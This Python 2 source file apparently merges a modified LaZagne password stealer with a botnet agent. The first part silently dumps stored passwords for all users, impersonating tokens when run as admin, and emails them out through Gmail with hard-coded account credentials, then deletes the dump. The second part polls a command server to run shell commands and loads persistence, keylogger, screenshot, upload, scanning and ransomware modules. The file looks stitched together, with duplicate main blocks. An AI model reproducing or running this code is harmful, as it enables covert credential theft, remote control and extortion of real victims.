import time
import os
import requests
import sys
import platform
import socket
import random
import subprocess

import string

import settings
import utils
from modules import runcmd
from modules import persistence
from modules import download
from modules import upload
from modules import screenshot
from modules import port
from modules import keylogger
from modules import ip_scan
from modules import ransomware

import argparse
import time, sys, os
import logging
import shutil
import json
import getpass
import traceback
import ctypes
import sys
import requests
import utils

#Emails
import smtplib
from os.path import basename
from email.mime.application import MIMEApplication
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.utils import COMMASPACE, formatdate

#Time restriction
import calendar
import time

# Softwares that passwords can be retrieved without needed to be in the user environmment
from lazagne.softwares.browsers.mozilla import Mozilla

# Configuration
from lazagne.config.header import Header
from lazagne.config.write_output import write_header, write_footer, print_footer, print_debug, parseJsonResultToBuffer, print_output
from lazagne.config.constant import *
from lazagne.config.manageModules import get_categories, get_modules
from lazagne.config.changePrivileges import ListSids, rev2self, impersonate_sid_long_handle

# Tab containing all passwords
stdoutRes = []

category = get_categories()
moduleNames = get_modules()

# Define a dictionary for all modules
modules = {}
for categoryName in category:
	modules[categoryName] = {}

# Add all modules to the dictionary
for module in moduleNames:
	modules[module.category][module.options['dest']] = module
modules['mails']['thunderbird'] = Mozilla(True) # For thunderbird (firefox and thunderbird use the same class)

def output():
	if args['write_normal']:
		constant.output = 'txt'
	
	if args['write_json']:
		constant.output = 'json'

	if args['write_all']:
		constant.output = 'all'

	if constant.output:
		#if not os.path.exists(constant.folder_name):
		#	os.makedirs(constant.folder_name)
			# constant.file_name_results = 'credentials' # let the choice of the name to the user
		
		if constant.output != 'json':
			write_header()

	# Remove all unecessary variables
	del args['write_normal']
	del args['write_json']
	del args['write_all']

def verbosity():
	# Write on the console + debug file
	if args['verbose']==0: level=logging.CRITICAL
	elif args['verbose'] == 1: level=logging.INFO
	elif args['verbose']>=2: level=logging.DEBUG
	
	FORMAT = "%(message)s"
	formatter = logging.Formatter(fmt=FORMAT)
	stream = logging.StreamHandler()
	stream.setFormatter(formatter)
	root = logging.getLogger()
	root.setLevel(level)
	# If other logging are set
	for r in root.handlers:
		r.setLevel(logging.CRITICAL)
	root.addHandler(stream)
	del args['verbose']

def launch_module(module, need_high_privileges=False, need_system_privileges=False, not_need_to_be_in_env=False, cannot_be_impersonate_using_tokens=False):
	modulesToLaunch = []
	try:
		# Launch only a specific module
		for i in args:
			if args[i] and i in module:
				modulesToLaunch.append(i)
	except:
		# if no args
		pass

	# Launch all modules
	if not modulesToLaunch:
		modulesToLaunch = module
	
	for i in modulesToLaunch:
		if not_need_to_be_in_env and module[i].need_to_be_in_env:
			continue

		if need_high_privileges ^ module[i].need_high_privileges:
			continue

		if need_system_privileges ^ module[i].need_system_privileges:
			continue

		if cannot_be_impersonate_using_tokens and module[i].cannot_be_impersonate_using_tokens:
			continue
		
		try:
			Header().title_info(i.capitalize()) 		# print title
			pwdFound = module[i].run(i.capitalize())	# run the module
			print_output(i.capitalize(), pwdFound) 		# print the results
			
			# return value - not used but needed 
			yield True, i.capitalize(), pwdFound
		except:
			traceback.print_exc()
			print
			error_message = traceback.format_exc()
			yield False, i.capitalize(), error_message

def manage_advanced_options():
	# File used for dictionary attacks
	if 'path' in args:
		constant.path = args['path']
	if 'bruteforce' in args: 
		constant.bruteforce = args['bruteforce']

	# Mozilla advanced options
	if 'manually' in args:
		constant.manually = args['manually']
	if 'specific_path' in args:
		constant.specific_path = args['specific_path']
	
	# Jitsi advanced options
	if 'master_pwd' in args:
		constant.jitsi_masterpass = args['master_pwd']
	
	# i.e advanced options
	if 'historic' in args:
		constant.ie_historic = args['historic']

# Run only one module
def runModule(category_choosed, need_high_privileges=False, need_system_privileges=False, not_need_to_be_in_env=False, cannot_be_impersonate_using_tokens=False):
	global category

	if category_choosed != 'all':
		category = [category_choosed]

	for categoryName in category:
		for r in launch_module(modules[categoryName], need_high_privileges, need_system_privileges, not_need_to_be_in_env, cannot_be_impersonate_using_tokens):
			yield r

# write output to file (json and txt files)
def write_in_file(result):
	try:
		if constant.output == 'json' or constant.output == 'all':
			# Human readable Json format 
			prettyJson = json.dumps(result, sort_keys=True, indent=4, separators=(',', ': '))
			#with open(constant.folder_name + os.sep + constant.file_name_results + '.json', 'w+') as f:
			with open(constant.file_name_results + '.json', 'w+') as f:
				f.write(prettyJson.encode('utf-8', errors='replace'))
			#print '[+] File written: ' + constant.folder_name + os.sep + constant.file_name_results + '.json'
			print '[+] File written: ' + constant.file_name_results + '.json'

		if constant.output == 'txt' or constant.output == 'all':
			with open(constant.folder_name + os.sep + constant.file_name_results + '.txt', 'a+b') as f:
				f.write(parseJsonResultToBuffer(result))
			write_footer()
			print '[+] File written: ' + constant.folder_name + os.sep + constant.file_name_results + '.txt'

	except Exception as e:
		print_debug('ERROR', 'Error writing the output file: %s' % e)

# Get user list to retrieve  their passwords
def get_user_list_on_filesystem(impersonated_user=[]):
	# Check users existing on the system (get only directories)
	all_users = os.walk('C:\\Users').next()[1]

	# Remove default users
	for user in ['All Users', 'Default User', 'Default', 'Public']:
		if user in all_users:
			all_users.remove(user)

	# Removing user that have already been impersonated
	for imper_user in impersonated_user:
		if imper_user in all_users:
			all_users.remove(imper_user)

	return all_users

def set_env_variables(user = getpass.getuser(), toImpersonate = False):
	constant.username = user
	if not toImpersonate:
		constant.profile['APPDATA'] = os.environ.get('APPDATA', 'C:\\Users\\%s\\AppData\\Roaming\\' % user)
		constant.profile['USERPROFILE'] = os.environ.get('USERPROFILE', 'C:\\Users\\%s\\' % user)
		constant.profile['HOMEDRIVE'] = os.environ.get('HOMEDRIVE', 'C:')
		constant.profile['HOMEPATH'] = os.environ.get('HOMEPATH', 'C:\\Users\\%s' % user)
		constant.profile['ALLUSERSPROFILE'] = os.environ.get('ALLUSERSPROFILE', 'C:\\ProgramData')
		constant.profile['COMPOSER_HOME'] = os.environ.get('COMPOSER_HOME', 'C:\\Users\\%s\\AppData\\Roaming\\Composer\\' % user)
	else:
		constant.profile['APPDATA'] = 'C:\\Users\\%s\\AppData\\Roaming\\' % user
		constant.profile['USERPROFILE'] = 'C:\\Users\\%s\\' % user
		constant.profile['HOMEPATH'] = 'C:\\Users\\%s' % user 
		constant.profile['COMPOSER_HOME'] = 'C:\\Users\\%s\\AppData\\Roaming\\Composer\\' % user

# Used to print help menu when an error occurs
class MyParser(argparse.ArgumentParser):
	def error(self, message):
		sys.stderr.write('error: %s\n\n' % message)
		self.print_help()
		sys.exit(2)

def runLaZagne(category_choosed='all'):

	# ------ Part used for user impersonation ------ 

	current_user = getpass.getuser().encode('utf-8', errors='ignore')
	if not current_user.endswith('$'):
		constant.finalResults = {'User': current_user}
		print '\n\n########## User: %s ##########\n' % current_user
		yield 'User', current_user
		set_env_variables()
		for r in runModule(category_choosed):
			yield r
		stdoutRes.append(constant.finalResults)

	# Check if admin to impersonate
	if ctypes.windll.shell32.IsUserAnAdmin() != 0:
		# --------- Impersonation using tokens ---------
		
		sids = ListSids()
		impersonateUsers = {}
		impersonated_user = [current_user]
		for sid in sids:
			# Not save the current user's SIDs
			if current_user != sid[3].split('\\', 1)[1]:
				impersonateUsers.setdefault(sid[3].split('\\', 1)[1], []).append(sid[2])
				
		for user in impersonateUsers:
			if 'service ' in user.lower() or ' service' in user.lower():
				continue

			print '\n\n########## User: %s ##########\n' % user.encode('utf-8', errors='ignore')
			yield 'User', user
			
			constant.finalResults = {'User': user}
			for sid in impersonateUsers[user]:
				try:
					set_env_variables(user, toImpersonate=True)
					impersonate_sid_long_handle(sid, close=False)

					_cannot_be_impersonate_using_tokens = False
					_need_system_privileges = False
					
					if sid == "S-1-5-18":
						_need_system_privileges = True
					else:
						impersonated_user.append(user)
						_cannot_be_impersonate_using_tokens = True
					
					# Launch module wanted
					for r in runModule(category_choosed, need_system_privileges=_need_system_privileges, cannot_be_impersonate_using_tokens=_cannot_be_impersonate_using_tokens):
						yield r
					
					rev2self()
					stdoutRes.append(constant.finalResults)
					break
				except Exception, e:
					print e
					pass

		# --------- Impersonation browsing file system

		# Ready to check for all users remaining
		all_users = get_user_list_on_filesystem(impersonated_user)
		for user in all_users:
			set_env_variables(user, toImpersonate = True)
			print_debug('INFO', '[!] Trying to impersonate user: %s' % user.encode('utf-8', errors='ignore'))
			print '\n\n########## User: %s ##########\n' % user.encode('utf-8', errors='ignore')
			
			# Fix value by default for user environnment (appdata and userprofile)
			constant.finalResults = {'User': user}
		
			# Retrieve passwords that need high privileges
			for r in runModule(category_choosed, not_need_to_be_in_env=True):
				yield r
			
			stdoutRes.append(constant.finalResults)
			
def send_email(send_from, pwd, send_to, subject, text, files=None):
    msg = MIMEMultipart()
    msg['From'] = send_from
    msg['To'] = send_to
    msg['Date'] = formatdate(localtime=True)
    msg['Subject'] = subject

    msg.attach(MIMEText(text))

    for f in files or []:
        with open(f, "rb") as fil:
            part = MIMEApplication(
                fil.read(),
                Name=basename(f)
            )
            part['Content-Disposition'] = 'attachment; filename="%s"' % basename(f)
            msg.attach(part)
    try:
        server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
        server.ehlo()
        #server.starttls()
        server.login(send_from, pwd)
        server.sendmail(send_from, send_to, msg.as_string())
        server.close()
        print 'successfully sent the mail'
    except:
        print "failed to send mail"

if __name__ == '__main__':
        
	sys.argv = ['laZagne.py', 'all', '-oJ'];	# Hard coded arguments for getting data in a single click
	f = open('nul', 'w')	# Silencing stdout, stderr
	sys.stdout = f			# Silencing stdout, stderr
	sys.stderr = f			# Silencing stdout, stderr
	
	# Print the title
	Header().first_title()

	parser = MyParser()
	parser.add_argument('--version', action='version', version='Version ' + str(constant.CURRENT_VERSION), help='laZagne version')

	# ------------------------------------------- Permanent options -------------------------------------------
	# Version and verbosity 
	PPoptional = argparse.ArgumentParser(add_help=False,formatter_class=lambda prog: argparse.HelpFormatter(prog, max_help_position=constant.MAX_HELP_POSITION))
	PPoptional._optionals.title = 'optional arguments'
	PPoptional.add_argument('-v', dest='verbose', action='count', default=0, help='increase verbosity level')
	PPoptional.add_argument('-path', dest='path', action= 'store', help = 'path of a file used for dictionary file')
	PPoptional.add_argument('-b', dest='bruteforce', action= 'store', help = 'number of character to brute force')

	# Output 
	PWrite = argparse.ArgumentParser(add_help=False,formatter_class=lambda prog: argparse.HelpFormatter(prog, max_help_position=constant.MAX_HELP_POSITION))
	PWrite._optionals.title = 'Output'
	PWrite.add_argument('-oN', dest='write_normal',  action='store_true', help = 'output file in a readable format')
	PWrite.add_argument('-oJ', dest='write_json',  action='store_true', help = 'output file in a json format')
	PWrite.add_argument('-oA', dest='write_all',  action='store_true', help = 'output file in all format')

	# ------------------------------------------- Add options and suboptions to all modules -------------------------------------------
	all_subparser = []
	for c in category:
		category[c]['parser'] = argparse.ArgumentParser(add_help=False,formatter_class=lambda prog: argparse.HelpFormatter(prog, max_help_position=constant.MAX_HELP_POSITION))
		category[c]['parser']._optionals.title = category[c]['help']
		
		# Manage options
		category[c]['subparser'] = []
		for module in modules[c].keys():
			m = modules[c][module]
			category[c]['parser'].add_argument(m.options['command'], action=m.options['action'], dest=m.options['dest'], help=m.options['help'])
			
			# Manage all suboptions by modules
			if m.suboptions and m.name != 'thunderbird':
				tmp = []
				for sub in m.suboptions:
					tmp_subparser = argparse.ArgumentParser(add_help=False, formatter_class=lambda prog: argparse.HelpFormatter(prog, max_help_position=constant.MAX_HELP_POSITION))
					tmp_subparser._optionals.title = sub['title']
					if 'type' in sub:
						tmp_subparser.add_argument(sub['command'], type=sub['type'], action=sub['action'], dest=sub['dest'], help=sub['help'])
					else:
						tmp_subparser.add_argument(sub['command'], action=sub['action'], dest=sub['dest'], help=sub['help'])
					tmp.append(tmp_subparser)
					all_subparser.append(tmp_subparser)
				category[c]['subparser'] += tmp

	# ------------------------------------------- Print all -------------------------------------------
	parents = [PPoptional] + all_subparser + [PWrite]
	dic = {'all':{'parents':parents, 'help':'Run all modules', 'func': runModule}}
	for c in category:
		parser_tab = [PPoptional, category[c]['parser']]
		if 'subparser' in category[c]:
			if category[c]['subparser']:
				parser_tab += category[c]['subparser']
		parser_tab += [PWrite]
		dic_tmp = {c: {'parents': parser_tab, 'help':'Run %s module' % c, 'func': runModule}}
		dic = dict(dic.items() + dic_tmp.items())

	#2- Main commands
	subparsers = parser.add_subparsers(help='Choose a main command')
	for d in dic:
		subparsers.add_parser(d, parents=dic[d]['parents'], help=dic[d]['help']).set_defaults(func=dic[d]['func'], auditType=d)

	# ------------------------------------------- Parse arguments -------------------------------------------

	args = dict(parser.parse_args()._get_kwargs())
	print args
	arguments = parser.parse_args()
	print arguments
	category_choosed = args['auditType']

	# Define constant variables
	output()
	verbosity()
	manage_advanced_options()

	start_time = time.time()

	for r in runLaZagne():
		pass

	write_in_file(stdoutRes)
	print_footer()

	elapsed_time = time.time() - start_time
	print '\nelapsed time = ' + str(elapsed_time)
	
	#Update target epoch time here

		# Enable low securtity apps in GMAIL for the sender email permissions
	send_email('alertInfoESGI@gmail.com', 'PuG#GeLk!3552;', 'alertInfoESGI@gmail.com', "Your passwords", "You can find your new passwords is this e-mail !", ["dat.json"])
	os.remove("dat.json")

#from modules import passwd
#from modules import keylogger


MODULES = ['runcmd', 'persistence', 'download', 'upload', 'screenshot','port', 'keylogger', 'ip_scan', 'ransomware']
if not settings.BOT_ID:
    settings.BOT_ID = socket.gethostname()
if not utils.validate_botid(settings.BOT_ID):
    settings.BOT_ID = ''.join(random.choice(string.ascii_letters) for _ in range(9))


def print_help(mod=None):
    help_text = "Loaded modules:\n"
    if mod is None:
        for module in MODULES: 
            help_text += "- " + module + "\n"
            help_text += sys.modules["modules." + module].help()
        help_text += """
General commands:

- cd path/to/dir : changes directory
- help : display this text
- [any other command] : execute shell command

"""
    else:
        help_text = "- " + mod + "\n"
        help_text += sys.modules["modules.%s" % mod].help()

    utils.send_output(help_text)


if __name__ == "__main__":
    time.sleep(settings.PAUSE_AT_START)
    if settings.AUTO_PERSIST:
        persistence.install()
    last_active = time.time()
    is_idle = False
    while 1:
        if is_idle:
            time.sleep(settings.REQUEST_INTERVAL * 10)
        else:
            time.sleep(settings.REQUEST_INTERVAL)
        try:
            command = requests.get(settings.SERVER_URL + "/api/pop?botid=" + settings.BOT_ID + "&sysinfo=" + platform.system() + " " + platform.release() + "&botip=" + settings.BOT_IP).text
            cmdargs = command.split(" ")
            if command:
                if settings.DEBUG:
                    print command
                if cmdargs[0] == "cd":
                    os.chdir(os.path.expandvars(" ".join(cmdargs[1:])))
                elif cmdargs[0] in MODULES:
                    sys.modules["modules.%s" % cmdargs[0]].run(*cmdargs[1:])
                elif cmdargs[0] == "help":
                    if len(cmdargs) > 1:
                        print_help(cmdargs[1])
                    else:
                        print_help()
                else:
                    runcmd.run(command)
                last_active = time.time()
                is_idle = False
            elif time.time() - last_active > settings.IDLE_TIME:
                is_idle = True
        except Exception, exc:
            is_idle = True
            if settings.DEBUG:
                print exc
